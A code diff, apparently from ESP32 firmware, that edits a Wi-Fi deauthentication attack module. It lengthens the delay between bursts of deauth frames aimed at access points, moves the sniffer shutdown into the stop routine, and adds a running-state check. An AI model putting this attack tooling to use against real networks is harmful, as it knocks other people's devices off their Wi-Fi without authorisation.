@@ -253,7 +253,7 @@ static void deauther_send_frames(const target_info_t *target)
                     // Burst di pacchetti
                     for(int k=0; k<7; k++) {
                         execute_attack_on_target(aps->ap[i].bssid, (const char*)aps->ap[i].ssid, current_ch);
-                        vTaskDelay(pdMS_TO_TICKS(4)); 
+                        vTaskDelay(pdMS_TO_TICKS(10)); 
                     }
                 }
                 if ((esp_timer_get_time() - start_time) / 1000 > (ATTACK_WINDOW - 20)) break;
@@ -275,7 +275,7 @@ static void deauther_send_frames(const target_info_t *target)
         int64_t start_time = esp_timer_get_time();
         while(true) {
             execute_attack_on_target(target->bssid, (const char*)target->ssid, target->channel);
-            vTaskDelay(pdMS_TO_TICKS(4)); 
+            vTaskDelay(pdMS_TO_TICKS(10)); 
             if ((esp_timer_get_time() - start_time) / 1000 > (ATTACK_WINDOW - 20)) break;
         }
         int64_t elapsed = (esp_timer_get_time() - start_time) / 1000;
@@ -319,8 +319,6 @@ static void deauther_task(void *pvParameters)
             wifi_sniffer_scan_fill_aps();
         }
     }
-
-    wifi_stop_sniffing();
     vTaskDelete(NULL);
 }
 
@@ -360,5 +358,13 @@ void deauther_stop(void)
         timeout++;
     }
     deauther_task_handle = NULL;
+    wifi_stop_sniffing();
+
     ESP_LOGI(TAG, "Deauth Attack Stopped.");
+}
+
+
+bool deauther_is_running(void)
+{
+    return deauther_running;
 }
